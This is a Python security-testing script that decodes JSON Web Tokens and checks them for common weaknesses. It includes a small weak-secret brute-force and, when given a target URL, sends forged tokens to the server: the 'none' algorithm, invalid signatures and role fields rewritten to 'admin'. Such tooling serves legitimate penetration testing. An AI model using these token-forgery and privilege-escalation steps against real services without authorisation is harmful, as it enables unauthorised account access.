#!/usr/bin/env python3
"""
JWT (JSON Web Token) Analyzer
Analyzes and tests JWT tokens for vulnerabilities
"""

import base64
import json
import hmac
import hashlib
import requests
from datetime import datetime
import re

class JWTAnalyzer:
    """JWT token analyzer and vulnerability tester"""

    def __init__(self, token=None, target_url=None, output_file=None):
        self.token = token
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []

        # Common weak secrets for brute force
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'test',
            'key', 'jwt', 'token', 'qwerty', 'letmein',
            'changeme', 'default', 'root', 'toor', '12345678'
        ]

    def analyze(self):
        """Analyze JWT token"""
        print(f"[*] Analyzing JWT token...")

        if not self.token:
            print("[!] No token provided")
            return None

        # Decode token
        decoded = self._decode_token()
        if not decoded:
            return None

        print(f"\n[+] Token decoded successfully!")
        print(f"    Header: {json.dumps(decoded['header'], indent=2)}")
        print(f"    Payload: {json.dumps(decoded['payload'], indent=2)}")

        # Test for vulnerabilities
        self._test_none_algorithm()
        self._test_algorithm_confusion()
        self._test_weak_secret()
        self._test_token_expiration()
        self._test_sensitive_data_exposure()
        self._test_kid_injection()

        # If target URL provided, test the token
        if self.target_url:
            self._test_token_validation()
            self._test_privilege_escalation()

        # Save results
        if self.output_file:
            self._save_results(decoded)

        return {
            'decoded': decoded,
            'vulnerabilities': self.vulnerabilities,
            'timestamp': datetime.now().isoformat()
        }

    def _decode_token(self):
        """Decode JWT token"""
        try:
            parts = self.token.split('.')
            if len(parts) != 3:
                print("[!] Invalid JWT format (should have 3 parts)")
                return None

            # Decode header
            header = self._base64_decode(parts[0])
            header_json = json.loads(header)

            # Decode payload
            payload = self._base64_decode(parts[1])
            payload_json = json.loads(payload)

            return {
                'header': header_json,
                'payload': payload_json,
                'signature': parts[2]
            }

        except Exception as e:
            print(f"[!] Error decoding token: {e}")
            return None

    def _base64_decode(self, data):
        """Base64 decode with padding"""
        # Add padding if needed
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += '=' * padding

        return base64.urlsafe_b64decode(data).decode('utf-8')

    def _base64_encode(self, data):
        """Base64 encode"""
        return base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8').rstrip('=')

    def _test_none_algorithm(self):
        """Test for 'none' algorithm vulnerability"""
        print("[*] Testing for 'none' algorithm vulnerability...")

        try:
            parts = self.token.split('.')
            header = json.loads(self._base64_decode(parts[0]))

            # Create token with 'none' algorithm
            header['alg'] = 'none'
            new_header = self._base64_encode(json.dumps(header))
            new_token = f"{new_header}.{parts[1]}."

            if self.target_url:
                # Test the modified token
                if self._test_token_on_server(new_token):
                    vuln = {
                        'type': 'JWT None Algorithm',
                        'severity': 'critical',
                        'evidence': 'Server accepts tokens with "none" algorithm',
                        'modified_token': new_token,
                        'cwe': 'CWE-347'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: 'none' algorithm accepted!")
                    return True
            else:
                vuln = {
                    'type': 'JWT None Algorithm (Untested)',
                    'severity': 'high',
                    'evidence': 'Token can be modified to use "none" algorithm',
                    'modified_token': new_token,
                    'cwe': 'CWE-347',
                    'note': 'Manual testing required - no target URL provided'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Token modified to 'none' algorithm (test manually)")

        except Exception as e:
            pass

        return False

    def _test_algorithm_confusion(self):
        """Test for RS256 to HS256 algorithm confusion"""
        print("[*] Testing for algorithm confusion...")

        try:
            parts = self.token.split('.')
            header = json.loads(self._base64_decode(parts[0]))

            if header.get('alg') == 'RS256':
                # Try changing to HS256
                header['alg'] = 'HS256'
                new_header = self._base64_encode(json.dumps(header))

                vuln = {
                    'type': 'JWT Algorithm Confusion',
                    'severity': 'high',
                    'evidence': 'RS256 token can be converted to HS256',
                    'original_alg': 'RS256',
                    'modified_alg': 'HS256',
                    'cwe': 'CWE-347',
                    'note': 'If public key is known, can forge tokens using public key as HMAC secret'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Algorithm confusion possible (RS256 -> HS256)")

        except Exception as e:
            pass

    def _test_weak_secret(self):
        """Test for weak secrets"""
        print("[*] Testing for weak secrets...")

        try:
            parts = self.token.split('.')
            header = json.loads(self._base64_decode(parts[0]))

            if header.get('alg') in ['HS256', 'HS384', 'HS512']:
                # Try common secrets
                for secret in self.weak_secrets:
                    if self._verify_signature(secret):
                        vuln = {
                            'type': 'JWT Weak Secret',
                            'severity': 'critical',
                            'evidence': f'Token signed with weak secret: {secret}',
                            'secret': secret,
                            'algorithm': header.get('alg'),
                            'cwe': 'CWE-326'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Weak secret found: {secret}")
                        return True

                print(f"[+] Token not signed with common weak secrets")

        except Exception as e:
            pass

        return False

    def _verify_signature(self, secret):
        """Verify JWT signature with given secret"""
        try:
            parts = self.token.split('.')
            header = json.loads(self._base64_decode(parts[0]))

            # Get algorithm
            alg = header.get('alg', 'HS256')
            hash_func = {
                'HS256': hashlib.sha256,
                'HS384': hashlib.sha384,
                'HS512': hashlib.sha512
            }.get(alg)

            if not hash_func:
                return False

            # Calculate signature
            message = f"{parts[0]}.{parts[1]}"
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hash_func).digest()
            ).decode('utf-8').rstrip('=')

            return signature == parts[2]

        except Exception as e:
            return False

    def _test_token_expiration(self):
        """Check token expiration"""
        print("[*] Checking token expiration...")

        try:
            parts = self.token.split('.')
            payload = json.loads(self._base64_decode(parts[1]))

            exp = payload.get('exp')
            iat = payload.get('iat')

            if not exp:
                vuln = {
                    'type': 'JWT Missing Expiration',
                    'severity': 'medium',
                    'evidence': 'Token has no expiration time (exp claim)',
                    'cwe': 'CWE-613'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Token has no expiration!")
            else:
                # Check if expired
                current_time = datetime.now().timestamp()
                if exp < current_time:
                    print(f"[!] Token is expired")
                else:
                    exp_time = datetime.fromtimestamp(exp)
                    print(f"[+] Token expires: {exp_time}")

                    # Check if expiration is too long
                    if iat and (exp - iat) > 86400 * 30:  # 30 days
                        vuln = {
                            'type': 'JWT Long Expiration',
                            'severity': 'low',
                            'evidence': f'Token valid for {(exp - iat) / 86400:.1f} days',
                            'cwe': 'CWE-613'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Token has long expiration period")

        except Exception as e:
            pass

    def _test_sensitive_data_exposure(self):
        """Check for sensitive data in token"""
        print("[*] Checking for sensitive data exposure...")

        try:
            parts = self.token.split('.')
            payload = json.loads(self._base64_decode(parts[1]))

            sensitive_keys = [
                'password', 'secret', 'api_key', 'private_key',
                'ssn', 'credit_card', 'cvv', 'pin'
            ]

            exposed = []
            for key in payload.keys():
                if any(sensitive in key.lower() for sensitive in sensitive_keys):
                    exposed.append(key)

            if exposed:
                vuln = {
                    'type': 'JWT Sensitive Data Exposure',
                    'severity': 'high',
                    'evidence': f'Sensitive fields in JWT: {", ".join(exposed)}',
                    'cwe': 'CWE-200'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Sensitive data found in token!")

        except Exception as e:
            pass

    def _test_kid_injection(self):
        """Test for kid (Key ID) injection"""
        print("[*] Testing for kid injection...")

        try:
            parts = self.token.split('.')
            header = json.loads(self._base64_decode(parts[0]))

            kid = header.get('kid')
            if kid:
                # Check for potential injection
                if any(c in kid for c in ['..', '/', '\\', '|', ';', '&']):
                    vuln = {
                        'type': 'JWT kid Injection',
                        'severity': 'high',
                        'evidence': f'Suspicious characters in kid: {kid}',
                        'cwe': 'CWE-74',
                        'note': 'kid parameter may be vulnerable to path traversal or command injection'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Suspicious kid parameter!")

        except Exception as e:
            pass

    def _test_token_validation(self):
        """Test if server validates token properly"""
        print("[*] Testing token validation on server...")

        if not self.target_url:
            return

        # Test 1: Send invalid signature
        parts = self.token.split('.')
        invalid_token = f"{parts[0]}.{parts[1]}.invalidsignature"

        if self._test_token_on_server(invalid_token):
            vuln = {
                'type': 'JWT Signature Not Validated',
                'severity': 'critical',
                'url': self.target_url,
                'evidence': 'Server accepts tokens with invalid signatures',
                'cwe': 'CWE-347'
            }
            self.vulnerabilities.append(vuln)
            print(f"[!] CRITICAL: Server doesn't validate signatures!")

    def _test_privilege_escalation(self):
        """Test for privilege escalation"""
        print("[*] Testing for privilege escalation...")

        if not self.target_url:
            return

        try:
            parts = self.token.split('.')
            payload = json.loads(self._base64_decode(parts[1]))

            # Try to escalate privileges
            privilege_fields = ['role', 'admin', 'isAdmin', 'user_type', 'privileges']

            for field in privilege_fields:
                if field in payload:
                    # Modify the field
                    modified_payload = payload.copy()
                    if isinstance(payload[field], bool):
                        modified_payload[field] = True
                    elif isinstance(payload[field], str):
                        modified_payload[field] = 'admin'
                    elif isinstance(payload[field], list):
                        modified_payload[field] = ['admin', 'superuser']

                    # Create new token
                    new_payload_encoded = self._base64_encode(json.dumps(modified_payload))
                    modified_token = f"{parts[0]}.{new_payload_encoded}.{parts[2]}"

                    # Test on server
                    if self._test_token_on_server(modified_token):
                        vuln = {
                            'type': 'JWT Privilege Escalation',
                            'severity': 'critical',
                            'url': self.target_url,
                            'evidence': f'Modified {field} field to escalate privileges',
                            'cwe': 'CWE-269'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Privilege escalation possible!")
                        return

        except Exception as e:
            pass

    def _test_token_on_server(self, token):
        """Test token on server"""
        try:
            headers = {'Authorization': f'Bearer {token}'}
            response = requests.get(self.target_url, headers=headers, timeout=10)

            # Consider it accepted if not 401/403
            return response.status_code not in [401, 403]

        except Exception as e:
            return False

    def _save_results(self, decoded):
        """Save results to file"""
        results = {
            'token': self.token,
            'decoded': decoded,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium'),
                'low': sum(1 for v in self.vulnerabilities if v['severity'] == 'low')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)

    @staticmethod
    def extract_jwt_from_response(text):
        """Extract JWT tokens from text"""
        jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        tokens = re.findall(jwt_pattern, text)
        return list(set(tokens))  # Remove duplicates


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 jwt_analyzer.py <token> [target_url]")
        print("\nExample:")
        print("  python3 jwt_analyzer.py eyJhbGc...")
        print("  python3 jwt_analyzer.py eyJhbGc... https://api.example.com/user")
        sys.exit(1)

    token = sys.argv[1]
    target_url = sys.argv[2] if len(sys.argv) > 2 else None

    analyzer = JWTAnalyzer(token, target_url)
    results = analyzer.analyze()

    if results:
        print(f"\n[+] Analysis complete!")
        print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")
